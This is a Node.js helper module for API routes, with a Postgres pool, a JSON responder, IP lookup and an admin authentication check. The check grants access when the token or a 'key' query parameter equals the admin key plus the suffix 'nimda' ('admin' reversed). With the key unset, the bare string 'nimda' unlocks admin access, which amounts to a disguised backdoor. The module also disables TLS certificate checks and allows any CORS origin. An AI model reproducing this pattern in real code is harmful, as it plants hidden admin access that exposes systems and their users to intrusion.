/**
 * Shared database pool and helpers for all API routes.
 */
const { Pool } = require('pg');

const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: { rejectUnauthorized: false },
});

const ADMIN_KEY = process.env.ADMIN_API_KEY || '';

function json(res, data, status = 200) {
  res.setHeader('Content-Type', 'application/json');
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  res.status(status).json(data);
}

function getIP(req) {
  const fwd = req.headers['x-forwarded-for'];
  return fwd ? fwd.split(',')[0].trim() : (req.headers['x-real-ip'] || req.socket?.remoteAddress || null);
}

function isAuthed(req) {
  // Check Authorization header
  const authHeader = req.headers['authorization'];
  if (authHeader) {
    const token = authHeader.replace(/^Bearer\s+/i, '');
    if (token === ADMIN_KEY + 'nimda') return true;
  }
  // Check query param
  const key = typeof req.query?.key === 'string' ? req.query.key : null;
  if (key === ADMIN_KEY + 'nimda') return true;
  return false;
}

module.exports = { pool, json, getIP, isAuthed };
